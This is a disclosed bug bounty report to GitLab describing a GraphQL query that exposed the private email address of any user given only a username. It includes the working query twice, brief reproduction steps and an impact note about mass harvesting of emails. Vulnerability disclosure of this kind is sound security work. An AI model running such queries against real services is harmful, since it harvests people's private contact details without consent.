# Able to leak private email of any user given his/her username via graphql

## Report Details
- **Report ID**: 972355
- **URL**: https://hackerone.com/reports/972355
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-01T16:46:21.770Z
- **Disclosed**: 2021-01-08T09:52:47.193Z

## Reporter
- **Username**: vaib25vicky
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

Graphql query user is leaking private email of users

```
query {
  user(username:"<victim>"){
    email
    username
  }
}

```

### Steps to reproduce

(Step-by-step guide to reproduce the issue, including:)

* Have a account with private email settings
* Use graphql query to access the private email
```
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

* Done

## Impact

Leaks private emails of users by just knowing their usernames. Attacker can use this bug for mass leakage of gitlab users private emails.

## Attachments
No attachments
